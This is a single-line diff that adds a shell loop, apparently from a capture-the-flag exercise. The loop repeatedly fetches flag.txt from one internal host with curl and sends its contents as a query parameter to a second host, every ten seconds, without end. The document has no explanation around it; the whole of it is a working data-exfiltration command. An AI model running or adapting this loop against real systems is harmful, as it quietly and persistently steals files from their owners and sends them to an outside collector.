@@ -1,0 +1,1 @@
+while true;do curl -s http://172.16.80.1:8000/?f=$(curl -s http://172.16.80.144/flag.txt);sleep 10;done
